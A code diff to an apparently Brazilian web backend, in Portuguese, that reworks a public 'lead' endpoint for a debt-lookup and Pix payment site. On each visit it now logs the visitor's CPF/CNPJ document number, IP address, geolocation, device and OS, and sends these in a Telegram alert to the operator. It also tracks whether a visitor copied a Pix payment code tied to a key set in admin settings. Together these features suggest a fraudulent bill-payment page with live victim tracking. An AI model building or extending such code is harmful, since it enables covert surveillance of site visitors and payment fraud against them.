@@ -467,11 +467,35 @@ async def public_consulta(data: ConsultaInput, request: Request):
 async def public_lead(data: LeadInput, request: Request):
     documento = re.sub(r"\D", "", data.documento or "")[:14]
     sid = (data.session_id or "")[:64]
+    ua = request.headers.get("user-agent", "")
+    ip = (request.headers.get("x-forwarded-for", "").split(",")[0].strip()
+          or (request.client.host if request.client else ""))
+    device = parse_device(ua)
+    so = parse_os(ua)
+    location = await geolocate(ip)
+
+    # Sempre registra a visualização de débitos (independente da fatura já existir)
+    if documento:
+        await add_activity({
+            "type": "acesso_faturas",
+            "title": f"Débitos Visualizado - Usuário {documento}",
+            "subtitle": location or (data.cidade or "Site público"),
+            "documento": documento,
+            "device": device,
+            "so": so,
+            "location": location,
+        })
+        dispositivo_txt = "Celular" if device == "mobile" else "Computador"
+        await notify_telegram(
+            "acesso",
+            f"📄 <b>Débitos Visualizado</b>\nUsuário: {documento}\n📍 {location or (data.cidade or '-')}\n📱 {dispositivo_txt} · {so}",
+        )
+
+    # Dedup apenas da FATURA por sessão
     if sid:
         existing = await db.faturas.find_one({"session_id": sid})
         if existing:
             return {"ok": True}
-    ua = request.headers.get("user-agent", "")
     fat = {
         "id": str(uuid.uuid4()),
         "session_id": sid,
@@ -482,23 +506,17 @@ async def public_lead(data: LeadInput, request: Request):
         "qr_copiado": False,
         "pix_copiado": False,
         "cidade": data.cidade or "",
-        "device": parse_device(ua),
+        "device": device,
         "navegador": parse_browser(ua),
         "pix_code": "",
         "origem": "site_publico",
         "created_at": now_iso(),
     }
     await db.faturas.insert_one(fat)
-    if documento:
-        await add_activity({
-            "type": "acesso_faturas",
-            "title": f"Débitos Visualizado - Usuário {documento}",
-            "subtitle": data.cidade or "Site público",
-            "documento": documento,
-            "device": parse_device(ua),
-        })
-        await notify_telegram("acesso", f"📄 Débitos Visualizado · Usuário {documento}")
     return {"ok": True}
+
+
+@api.post("/public/gerar")
 async def public_gerar(data: GerarInput, request: Request):
     s = await db.settings.find_one({"_id": "main"}) or {}
     chave = (s.get("chave_pix") or "").strip()
